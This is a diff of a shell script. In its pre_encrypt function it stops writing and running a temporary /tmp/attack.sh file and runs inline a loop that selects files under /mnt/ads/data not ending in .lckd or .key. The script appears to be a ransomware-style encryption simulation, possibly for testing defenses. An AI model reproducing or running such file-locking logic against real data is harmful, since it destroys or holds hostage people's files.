@@ -183,11 +183,10 @@ snapshot_initial() {
 
 pre_encrypt() {
   ads_dir=/mnt/ads
-  
-  cat << EOF > /tmp/attack.sh
-cd $ads_dir/data;
-while :
-do
+
+  cd $ads_dir/data;
+  while :
+  do
         FILES=`find * -maxdepth 3 -type f \(  ! -iname "*.lckd"  ! -iname "*.key" \)`;
         for file in $FILES;
         do
@@ -204,11 +203,7 @@ do
 				fi
         done
         break
-done
-EOF
-
-  chmod +x /tmp/attack.sh
-  /tmp/attack.sh
+  done
 }
 
 do_install() {
